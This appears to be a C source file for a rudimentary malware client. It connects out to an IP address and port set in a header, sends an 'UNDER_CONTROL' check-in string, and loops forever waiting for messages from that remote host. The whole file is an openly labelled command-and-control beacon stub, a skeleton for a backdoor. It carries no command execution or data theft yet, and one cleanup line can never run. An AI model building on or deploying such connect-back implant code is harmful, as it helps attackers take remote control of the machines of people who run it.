#include "main.h"


int main(int argc, char** argv){
    socket_desc = socket(AF_INET, SOCK_STREAM, 0);
    
    server.sin_addr.s_addr = inet_addr(SOCKET_IP_ADDRESS);
    server.sin_family = AF_INET;
    server.sin_port = htons(SOCKET_PORT);

    if(connect(socket_desc, (struct sockaddr*)&server, sizeof(server)) < 0)
        return -1;

    malware();

    return 0;
}

void malware(){
    send(socket_desc, UNDER_CONTROL, strlen(UNDER_CONTROL), 0);
    
    while(1){
        if(recv(socket_desc, server_reply, 10000, 0) >= 0){
            printf("Message received\n");
            //send(socket_desc, received, strlen(received), 0);
	   }
    }
    close(socket_desc);
}